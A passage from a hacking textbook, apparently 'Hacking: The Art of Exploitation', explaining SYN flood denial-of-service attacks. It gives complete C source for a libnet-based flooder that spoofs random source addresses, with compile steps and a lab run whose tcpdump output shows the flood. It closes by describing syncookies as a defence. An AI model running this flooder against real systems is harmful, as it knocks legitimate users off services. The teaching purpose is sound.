<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x451 SYN Flooding</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part92.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part94.htm">Next &gt;</a></p><p class="s32" style="padding-top: 4pt;padding-left: 19pt;text-indent: 0pt;text-align: left;"><a name="bookmark82">0x451 SYN Flooding</a></p><p style="padding-top: 6pt;padding-left: 19pt;text-indent: 0pt;line-height: 108%;text-align: left;">A SYN flood tries to exhaust states in the TCP/IP stack. Since TCP maintains “reliable” connections, each connection needs to be tracked somewhere. The TCP/IP stack in the kernel handles this, but it has a finite table that can only track so many incoming connections. A SYN flood uses spoofing to take advantage of this limitation.</p><p style="padding-left: 19pt;text-indent: 17pt;line-height: 108%;text-align: left;">The attacker floods the victim’s system with many SYN packets, using a spoofed nonexistent source address. Since a SYN packet is used to initiate a TCP connection, the victim’s machine will send a SYN/ACK packet to the spoofed address in response and wait for the expected ACK response. Each of these waiting, half-open connections goes into a backlog queue that has limited space. Since the spoofed source addresses don’t actually exist, the ACK responses needed to remove these entries from the queue and complete the connections never come. Instead, each half-open connection must time out, which takes a relatively long time.</p><p style="padding-left: 19pt;text-indent: 17pt;line-height: 108%;text-align: left;">As long as the attacker continues to flood the victim’s system with spoofed SYN packets, the victim’s backlog queue will remain full, making it nearly impossible for real SYN packets to get to the system and initiate valid TCP/IP connections.</p><p style="padding-left: 19pt;text-indent: 18pt;line-height: 108%;text-align: left;">Using the Nemesis and arpspoof source code as reference, you should be able to write a program that performs this attack. The example program below uses libnet functions pulled from the source code and socket functions previ- ously explained. The Nemesis source code uses the function <span class="s31">libnet_get_prand() </span>to obtain pseudo-random numbers for various IP fields. The function <span class="s31">libnet_seed_prand() </span>is used to seed the randomizer. These functions are similarly used below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_750.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">#include &lt;libnet.h&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">#define FLOOD_DELAY 5000 // Delay between packet injects by 5000 ms.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">/* Returns an IP in x.x.x.x notation */ char *print_ip(u_long *ip_addr_ptr) {</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 10pt;text-align: left;">return inet_ntoa( *((struct in_addr *)ip_addr_ptr) );</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;text-align: left;">int main(int argc, char *argv[]) { u_long dest_ip;</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 10pt;text-align: left;">u_short dest_port;</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">if(argc &lt; 3)</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;line-height: 107%;text-align: left;">printf(&quot;Usage:\n%s\t &lt;target host&gt; &lt;target port&gt;\n&quot;, argv[0]); exit(1);</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 10pt;text-align: left;">}</p><p class="s31" style="padding-top: 2pt;padding-left: 32pt;text-indent: 0pt;text-align: left;">dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // The host dest_port = (u_short) atoi(argv[2]); // The port</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">network = libnet_open_raw_sock(IPPROTO_RAW); // Open network interface. if (network == -1)</p><p class="s31" style="padding-left: 19pt;text-indent: 25pt;text-align: left;">libnet_error(LIBNET_ERR_FATAL, &quot;can&#39;t open network interface. -- this program must run as root.\n&quot;);</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">libnet_init_packet(packet_size, &amp;packet); // Allocate memory for packet. if (packet == NULL)</p><p class="s31" style="padding-left: 32pt;text-indent: 12pt;line-height: 212%;text-align: left;">libnet_error(LIBNET_ERR_FATAL, &quot;can&#39;t initialize packet memory.\n&quot;); libnet_seed_prand(); // Seed the random number generator.</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">printf(&quot;SYN Flooding port %d of %s..\n&quot;, dest_port, print_ip(&amp;dest_ip)); while(1) // loop forever (until break by CTRL-C)</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 10pt;text-align: left;">{</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">libnet_build_ip(LIBNET_TCP_H,   // Size of the packet sans IP header.</p><p class="s31" style="padding-left: 57pt;text-indent: 0pt;text-align: left;">IPTOS_LOWDELAY,       // IP tos</p><p class="s31" style="padding-left: 57pt;text-indent: 0pt;text-align: left;">libnet_get_prand(LIBNET_PRu16), // IP ID (randomized) 0,               // Frag stuff</p><p class="s31" style="padding-left: 57pt;text-indent: 0pt;line-height: 106%;text-align: left;">libnet_get_prand(LIBNET_PR8),  // TTL (randomized) IPPROTO_TCP,          // Transport protocol libnet_get_prand(LIBNET_PRu32), // Source IP (randomized) dest_ip,            // Destination IP</p><p class="s31" style="padding-left: 57pt;text-indent: 0pt;text-align: left;">NULL,              // Payload (none)</p><p class="s31" style="padding-left: 57pt;text-indent: 0pt;text-align: left;">0,               // Payload length</p><p class="s31" style="padding-left: 57pt;text-indent: 0pt;text-align: left;">packet);            // Packet header memory</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 57pt;text-indent: -12pt;line-height: 107%;text-align: left;">libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // Source TCP port (random) dest_port,            // Destination TCP port libnet_get_prand(LIBNET_PRu32), // Sequence number (randomized) libnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized) TH_SYN,              // Control flags (SYN flag set only) libnet_get_prand(LIBNET_PRu16), // Window size (randomized)</p><p class="s31" style="padding-left: 57pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0,               // Urgent pointer</p><p class="s31" style="padding-left: 57pt;text-indent: 0pt;text-align: left;">NULL,              // Payload (none)</p><p class="s31" style="padding-left: 57pt;text-indent: 0pt;text-align: left;">0,               // Payload length</p><p class="s31" style="padding-left: 57pt;text-indent: 0pt;text-align: left;">packet + LIBNET_IP_H);     // Packet header memory</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 57pt;text-indent: -12pt;line-height: 107%;text-align: left;">if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1) libnet_error(LIBNET_ERR_FATAL, &quot;can&#39;t compute checksum\n&quot;);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">byte_count = libnet_write_ip(network, packet, packet_size); // Inject packet. if (byte_count &lt; packet_size)</p><p class="s31" style="padding-left: 19pt;text-indent: 38pt;text-align: left;">libnet_error(LIBNET_ERR_WARNING, &quot;Warning: Incomplete packet written. (%d of %d bytes)&quot;, byte_count, packet_size);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 44pt;text-indent: 0pt;text-align: left;">usleep(FLOOD_DELAY); // Wait for FLOOD_DELAY milliseconds.</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 32pt;text-indent: 0pt;text-align: left;">libnet_destroy_packet(&amp;packet); // Free packet memory.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">if (libnet_close_raw_sock(network) == -1) // Close the network interface.</p><p class="s31" style="padding-top: 2pt;padding-left: 44pt;text-indent: 0pt;text-align: left;">libnet_error(LIBNET_ERR_WARNING, &quot;can&#39;t close network interface.&quot;);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 32pt;text-indent: 0pt;text-align: left;">return 0;</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_751.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This program uses a <span class="s31">print_ip() </span>function to handle converting the u_long type, used by libnet to store IP addresses, to the struct type expected by <span class="s31">inet_ntoa()</span>. The value doesn’t change—the typecasting just appeases the compiler.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The current release of libnet is version 1.1, which is incompatible with libnet 1.0. However, Nemesis and arpspoof still rely on the 1.0 version of libnet, so this version is included in the LiveCD and this is also what we will use in our synflood program. Similar to compiling with libpcap, when compil- ing with libnet, the flag <span class="s31">-lnet </span>is used. However, this isn’t quite enough infor- mation for the compiler, as the output below shows.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_752.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -o synflood synflood.c -lnet In file included from synflood.c:1:</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">/usr/include/libnet.h:87:2: #error &quot;byte order has not been specified, you&#39;ll&quot; synflood.c:6: error: syntax error before string constant reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_753.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The compiler still fails because several mandatory define flags need to be set for libnet. Included with libnet, a program called libnet-config will output these flags.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_754.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ libnet-config --help Usage: libnet-config [OPTIONS]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Options:</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">[--libs]</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">[--cflags]</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">[--defines]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ libnet-config --defines</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-D_BSD_SOURCE -D<u> </u>BSD_SOURCE -D<u> </u>FAVOR_BSD -DHAVE_NET_ETHERNET_H</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-DLIBNET_LIL_ENDIAN</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_755.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Using the BASH shell’s command substitution in both, these defines can be dynamically inserted into the compile command.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_756.png"/></span></p><p class="s31" style="padding-top: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o synflood synflood.c -lnet</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./synflood Usage:</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">./synflood    &lt;target host&gt; &lt;target port&gt; reader@hacking:~/booksrc $</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./synflood 192.168.42.88 22</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Fatal: can&#39;t open network interface. -- this program must run as root. reader@hacking:~/booksrc $ sudo ./synflood 192.168.42.88 22</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">SYN Flooding port 22 of 192.168.42.88..</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_757.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">In the example above, the host 192.168.42.88 is a Windows XP machine running an openssh server on port 22 via cygwin. The tcpdump output below shows the spoofed SYN packets flooding the host from apparently random IPs. While the program is running, legitimate connections cannot be made to this port.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_758.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ sudo tcpdump -i eth0 -nl -c 15 &quot;host 192.168.42.88&quot; tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes 17:08:16.334498 IP 121.213.150.59.4584 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 9pt;text-align: left;">751659999:751659999(0) win 14609</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.346907 IP 158.78.184.110.40565 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">139725579:139725579(0) win 64357</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.358491 IP 53.245.19.50.36638 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">322318966:322318966(0) win 43747</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.370492 IP 91.109.238.11.4814 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">685911671:685911671(0) win 62957</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.382492 IP 52.132.214.97.45099 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">71363071:71363071(0) win 30490</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.394909 IP 120.112.199.34.19452 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1420507902:1420507902(0) win 53397</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.406491 IP 60.9.221.120.21573 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">2144342837:2144342837(0) win 10594</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.418494 IP 137.101.201.0.54665 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1185734766:1185734766(0) win 57243</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.430497 IP 188.5.248.61.8409 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1825734966:1825734966(0) win 43454</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.442911 IP 44.71.67.65.60484 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1042470133:1042470133(0) win 7087</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.454489 IP 218.66.249.126.27982 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1767717206:1767717206(0) win 50156</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.466493 IP 131.238.172.7.15390 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">2127701542:2127701542(0) win 23682</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.478497 IP 130.246.104.88.48221 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">2069757602:2069757602(0) win 4767</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.490908 IP 140.187.48.68.9179 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1429854465:1429854465(0) win 2092</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17:08:16.502498 IP 33.172.101.123.44358 &gt; 192.168.42.88.22: S</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1524034954:1524034954(0) win 26970</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">15 packets captured</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">30 packets received by filter 0 packets dropped by kernel</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ssh -v 192.168.42.88 OpenSSH_4.3p2, OpenSSL 0.9.8c 05 Sep 2006</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">debug1: Reading configuration data /etc/ssh/ssh_config debug1: Connecting to 192.168.42.88 [192.168.42.88] port 22.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">debug1: connect to address 192.168.42.88 port 22: Connection refused ssh: connect to host 192.168.42.88 port 22: Connection refused reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_759.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Some operating systems (for example, Linux) use a technique called syncookies to try to prevent SYN flood attacks. The TCP stack using syncookies adjusts the initial acknowledgment number for the responding SYN/ACK packet using a value based on host details and time (to prevent replay attacks).</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">The TCP connections don’t actually become active until the final ACK packet for the TCP handshake is checked. If the sequence number doesn’t match or the ACK never arrives, a connection is never created. This helps prevent spoofed connection attempts, since the ACK packet requires information to be sent to the source address of the initial SYN packet.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part92.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part94.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
